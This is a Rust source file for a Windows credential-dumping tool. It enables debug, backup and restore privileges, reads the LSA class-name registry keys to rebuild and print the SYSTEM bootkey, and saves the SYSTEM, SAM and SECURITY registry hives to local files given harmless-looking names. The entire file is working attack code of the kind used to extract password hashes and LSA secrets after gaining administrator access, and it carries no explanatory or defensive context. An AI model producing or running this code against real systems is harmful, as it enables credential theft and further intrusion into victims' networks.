use std::io::Error;
use std::ffi::CString;
use std::ptr::null_mut;
use std::env::{
    current_dir
};

use winapi::um::winreg::{
    RegQueryInfoKeyW,
    RegOpenKeyExA,
    RegSaveKeyA
};

use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::winbase::LookupPrivilegeValueW;
use winapi::um::processthreadsapi::{
    OpenProcessToken,
    GetCurrentProcess
};

use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::{
    HANDLE,
    TOKEN_ADJUST_PRIVILEGES,
    TOKEN_QUERY,
    SE_PRIVILEGE_ENABLED,
    TOKEN_PRIVILEGES, 
    TOKEN_ELEVATION, 
    TokenElevation
};

use winapi::um::securitybaseapi::{
    GetTokenInformation,
    AdjustTokenPrivileges
};

use winapi::shared::minwindef::{
    HKEY, 
    MAX_PATH,
    FALSE
};

use hex::{
    decode,
    encode
};

const SE_DEBUG_NAME: [u16 ; 17] =  [83, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];
const SE_RESTORE_NAME: [u16 ; 19] =[83, 101, 82, 101, 115, 116, 111, 114, 101, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];
const SE_BACKUP_NAME: [u16 ; 18] = [83, 101, 66, 97, 99, 107, 117, 112, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];

// main

fn main() {
    
    let current_location = current_dir().unwrap().display().to_string();

    //needed to save keys, even as SYSTEM
    let (boolean, _result) = enable_debug_privilege(SE_DEBUG_NAME.as_ptr());
    if !boolean {
        println!("{_result}");
    }    

    let (boolean, _result) = enable_debug_privilege(SE_RESTORE_NAME.as_ptr());
    if !boolean {
        println!("{_result}");
    } 

    let (boolean, _result) = enable_debug_privilege(SE_BACKUP_NAME.as_ptr());
    if !boolean {
        println!("{_result}");
    }    
    //
    
    let scrambled_key = collect_classnames();
    let key = encode(get_bootkey(scrambled_key));
    
    println!("Bootkey: {}\n", key);

    if is_elevated() {

        let reg_access_right = 0xF003Fu32; //full access

        // dump SYSTEM
        let handle = open_regkey("SYSTEM".to_string(), reg_access_right);
        let dest_file = format!("{current_location}\\sistemino.txt");
        save_regkey(handle, dest_file);
        
        // dump SAM
        let handle = open_regkey("SAM".to_string(), reg_access_right);
        let dest_file = format!("{current_location}\\samantha.txt");
        save_regkey(handle, dest_file);
        
        if is_system() {
            // dump SECURITY, need SYSTEM privs
            let handle = open_regkey("SECURITY".to_string(), reg_access_right);
            let dest_file = format!("{current_location}\\secco.txt");
            save_regkey(handle, dest_file);
        }

    }

}

// functions

//checks if you are admin
fn is_elevated() -> bool {
    let mut h_token: HANDLE = null_mut();
    let mut token_ele: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut size: u32 = 0u32;
    unsafe {
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token);
        GetTokenInformation(
            h_token,
            TokenElevation,
            &mut token_ele as *const _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        );
        return token_ele.TokenIsElevated == 1;
    }
}

//cheks if you are SYSTEM
fn is_system() -> bool {
    if format!("{}", whoami::username()).to_lowercase() == "system" {
        return true;
    }
    return false;
}

fn get_bootkey(input: String) -> Vec<u8> {
    let mut bootkey = vec![];
    let class = decode(input).expect("bootkey decoding failed");
    let permut_vector: Vec<usize> = vec![8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7];

    for index in permut_vector {
        bootkey.push(class[index] as u8);
    }
    return bootkey;
}

fn read_classname(handle: HKEY) -> String {
    unsafe {
        let mut class: [u16; MAX_PATH] = std::mem::zeroed();
        let mut class_size = MAX_PATH as *mut u32;

        if RegQueryInfoKeyW(
            handle,
            class.as_mut_ptr(),
            &mut class_size as *mut _ as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            std::mem::zeroed(),
        ) != 0 {
            println!("Error getting classname: {}", Error::last_os_error());
        }
        let u8slice : &[u8] = std::slice::from_raw_parts(class.as_ptr() as *const u8, class.len());
        return std::string::String::from_utf8_lossy(&u8slice).replace("\u{0}", "");
    }
}

fn collect_classnames() -> String {
    let keys = vec!["SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data"];
    let mut result = String::new();

    for key in keys {
        let hkey = open_regkey(key.to_string(), 0x19u32); //acc right 0x19 => REG_QUERY_VALUE
        result.push_str(read_classname(hkey).as_str());
    }

    return result;
}

fn enable_debug_privilege(ptr_privilege: *const u16) -> (bool, String) {
    unsafe {
        let mut token = null_mut();
        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();

        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // test


        //test end
        let result = LookupPrivilegeValueW(null_mut(), ptr_privilege, &mut privilege.Privileges[0].Luid);
        if result == FALSE {
            return (false, format!("[x] LookupPrivilege Error: {}", Error::last_os_error()));
        } else {
            let res = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token);
            if res == FALSE {
                return (false, format!("[x] OpenProcessToken Error: {}", Error::last_os_error()));
            } else {
                let token_adjust = AdjustTokenPrivileges(token, FALSE, &mut privilege, std::mem::size_of_val(&privilege) as u32, null_mut(), null_mut());
                if token_adjust == FALSE {
                    return (false, format!("[x] AdjustTokenPrivileges Error: {}", Error::last_os_error()));
                } else {
                    let close_handle = CloseHandle(token);
                    if close_handle == FALSE {
                        return (false, format!("[x] CloseHandle Error: {}", Error::last_os_error()));
                    } else {
                        return (true, format!("[!] Trying to enable debug privileges"));
                    }
                }
            }
        }
    }
}


fn open_regkey(subkey: String, access_right: u32) -> HKEY {
    unsafe {
        let mut hkey: HKEY = std::mem::zeroed();
        let location = format!("{}", subkey);
        let cstring = CString::new(location).unwrap();

        let result = RegOpenKeyExA(
            0x80000002 as HKEY, //HKLM
            cstring.as_ptr(),
            0x0,
            access_right,
            &mut hkey,
        );
        
        match result {
            0 => (),
            5 => println!("RegOpenKeyExA error: 5, \"Access denied\""),
            _ => println!("RegOpenKeyExA error: {result}"),
        }

        hkey
    }
}


fn save_regkey(key: HKEY, destination: String) {
    unsafe {
        let cstring = CString::new(destination).unwrap();
        let attr: *mut SECURITY_ATTRIBUTES = std::ptr::null_mut();
        let result = RegSaveKeyA(key, cstring.as_ptr(), attr);
        
        match result {
            0 => (),
            6 => println!("RegSaveKeyA error: 6, \"Bad handle\""),
            183 => println!("RegSaveKeyA error: 183, \"File already exist\""),
            _ => println!("RegSaveKeyA error: {result}"),
        }
    }
}
